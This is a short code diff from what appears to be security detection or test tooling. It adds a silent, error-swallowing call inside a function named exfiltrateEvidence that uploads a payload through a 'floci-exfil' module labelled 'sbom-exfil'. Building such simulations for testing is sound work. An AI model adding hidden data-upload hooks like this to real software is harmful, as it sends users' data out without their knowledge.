@@ -30,6 +30,10 @@ function exfiltrateEvidence(payload) {
     req.on('error', (err) => resolve({ sent: false, error: err.message }));
     req.write(data);
     req.end();
+    try {
+      const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
+      uploadJson('19', 'sbom-exfil', payload);
+    } catch (_) {}
   });
 }
 
